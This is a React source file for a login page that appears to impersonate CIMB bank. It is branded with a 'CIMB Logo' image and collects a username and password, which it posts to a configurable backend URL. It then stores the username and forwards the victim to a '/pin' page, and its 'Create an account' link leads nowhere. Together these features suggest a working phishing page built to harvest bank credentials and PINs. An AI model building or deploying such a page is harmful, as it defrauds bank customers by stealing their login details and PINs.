import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png"; // Adjust the path to your logo
import FormErrMsg from "../components/FormErrMsg";

const schema = yup.object().shape({
  username: yup.string().required("Username is required"),
  password: yup.string().required("Password is required"),
});

const Login = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePassword = () => setShowPassword(!showPassword);

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        localStorage.setItem("email", data.username);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("Login error", error);
      })
      .finally(() => setLoading(false));
  };

  return (
    <div className="min-h-screen bg-white flex items-start justify-center pt-[7em] px-4">
      <div className="w-full max-w-sm bg-white px-2 ">
        {/* Logo */}
        <div className="flex justify-center mb-12">
          <img src={logo} alt="CIMB Logo" className="w-[70%] min-h-[30px]" />
        </div>

        <form onSubmit={handleSubmit(submitForm)} className="space-y-4">
          {/* Username Field */}
          <div className="mb-[6em] space-y-5">
            <div>
              <input
                type="text"
                placeholder="Username"
                {...register("username")}
                className="w-full p-3 text-black bg-white border border-gray-300 rounded-full focus:outline-none placeholder:text-gray-500"
              />
              <FormErrMsg errors={errors} inputName="email" />
            </div>

            {/* Pin Field */}
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                {...register("password")}
                className="w-full p-3 text-black bg-white border border-gray-300 rounded-full focus:outline-none placeholder:text-gray-500"
              />
              <span
                onClick={togglePassword}
                className="absolute top-4 right-4 text-gray-400 cursor-pointer"
              >
                {showPassword ? (
                  <AiOutlineEyeInvisible className="text-xl" />
                ) : (
                  <AiOutlineEye className="text-xl" />
                )}
              </span>
              <FormErrMsg errors={errors} inputName="password" />
            </div>
          </div>
          {/* Login Button */}
          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 rounded-full font-semibold text-white ${
              loading
                ? "bg-red-300 cursor-not-allowed"
                : "bg-red-600 hover:bg-red-700"
            }`}
          >
            {loading ? "Logging in..." : "Login"}
          </button>
        </form>

        {/* Create Account */}
        <div className="mt-4 text-center">
          <p className="text-gray-600">
            <a href="#" className="text-lg">
              Create an account
            </a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
